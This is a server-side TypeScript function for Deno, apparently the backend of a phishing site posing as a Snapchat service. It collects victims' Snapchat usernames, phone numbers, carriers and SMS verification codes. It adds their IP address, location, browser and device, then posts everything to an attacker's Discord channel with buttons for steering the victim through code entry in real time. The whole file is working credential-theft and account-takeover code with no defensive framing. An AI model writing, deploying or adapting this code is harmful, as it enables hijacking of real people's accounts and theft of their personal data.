import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");

Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const { snapchat, telephone, operateur, code, submissionId } = await req.json();

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
  const userAgent = req.headers.get("user-agent") || "";

  let browser = "Inconnu";
  if (userAgent.includes("Chrome")) browser = "Chrome";
  else if (userAgent.includes("Safari")) browser = "Safari";
  else if (userAgent.includes("Firefox")) browser = "Firefox";
  else if (userAgent.includes("Edge")) browser = "Edge";

  let device = "💻 PC";
  if (userAgent.includes("Mobile") || userAgent.includes("Android")) device = "📱 Téléphone";
  else if (userAgent.includes("iPad")) device = "📱 Tablette";

  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";

  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;

  let country = "Inconnue";
  let city = "Inconnue";
  try {
    const geoRes = await fetch(`https://ip-api.com/json/${ip}`, { signal: AbortSignal.timeout(5000) });
    if (geoRes.ok) {
      const geo = await geoRes.json();
      if (geo.status === "success") {
        country = geo.country || "Inconnue";
        city = geo.city || "Inconnue";
      }
    }
  } catch (e) {
    console.error("Geolocation failed:", e.message);
  }

  const embed = {
    title: "🔑 Code SMS entré",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
      { name: "🔢 Code entré", value: `**${code}**`, inline: true },
      { name: "🌍 Pays", value: country, inline: true },
      { name: "🏙️ Ville", value: city, inline: true },
      { name: "🌐 Navigateur", value: browser, inline: true },
      { name: "💾 Appareil", value: device, inline: true },
      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
      { name: "🕐 Date", value: dateStr, inline: false },
      {
        name: "Actions",
        value: `✅ [Valider](${validUrl}) • ❌ [Changer numéro](${wrongUrl}) • ⏰ [Renvoyer code](${expiredUrl})`,
        inline: false
      },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  // Try to send in the private thread first
  let sentToThread = false;
  try {
    const sub = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
    if (sub?.thread_id) {
      const mention = sub.admin_discord_id ? `<@${sub.admin_discord_id}> ` : "";
      const threadRes = await fetch(`https://discord.com/api/v10/channels/${sub.thread_id}/messages`, {
        method: "POST",
        headers: {
          "Authorization": `Bot ${BOT_TOKEN}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: `${mention}🔑 **Code SMS entré !**`, embeds: [embed] })
      });
      if (threadRes.ok) sentToThread = true;
    }
  } catch (e) {
    console.error("Thread message failed:", e.message);
  }

  // Fallback to main webhook if no thread
  if (!sentToThread) {
    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
    });
  }

  return Response.json({ ok: true });
});